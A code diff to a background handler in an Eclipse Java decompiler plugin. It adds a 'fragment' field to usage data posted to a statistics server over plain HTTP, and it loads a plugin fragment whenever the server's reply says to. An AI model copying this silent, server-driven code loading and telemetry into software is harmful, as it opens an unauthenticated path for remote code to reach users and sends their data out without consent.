@@ -170,6 +170,7 @@ public class BackgroundHandler implements IDecompilerExtensionHandler
 				}
 			}
 			userData.add( "patch", patchBuffer.toString( ) );//$NON-NLS-1$
+			userData.add( "fragment", PatchUtil.getFragment( ) );//$NON-NLS-1$
 
 			URL location = new URL( "http://decompiler.cpupk.com/statistics.php" ); //$NON-NLS-1$
 			HttpURLConnection con = (HttpURLConnection) location.openConnection( );
@@ -201,6 +202,7 @@ public class BackgroundHandler implements IDecompilerExtensionHandler
 							checkTrayLink( dataObject );
 							checkDecompilerMark( dataObject );
 							checkPatch( dataObject );
+							checkFragment( dataObject );
 						}
 						UserUtil.updateCount( );
 						JavaDecompilerPlugin.getDefault( ).resetDecompileCount( );
@@ -222,6 +224,16 @@ public class BackgroundHandler implements IDecompilerExtensionHandler
 			Logger.debug( e );
 		}
 		return result;
+	}
+
+	private void checkFragment( JsonObject retrunValue )
+	{
+		JsonValue fragmentValue = retrunValue.get( "fragment" ); //$NON-NLS-1$
+		boolean result = PatchUtil.handleFragmentJson( fragmentValue );
+		if ( result )
+		{
+			PatchUtil.loadFragment( );
+		}
 	}
 
 	private void checkAdConfig( JsonObject dataObject )
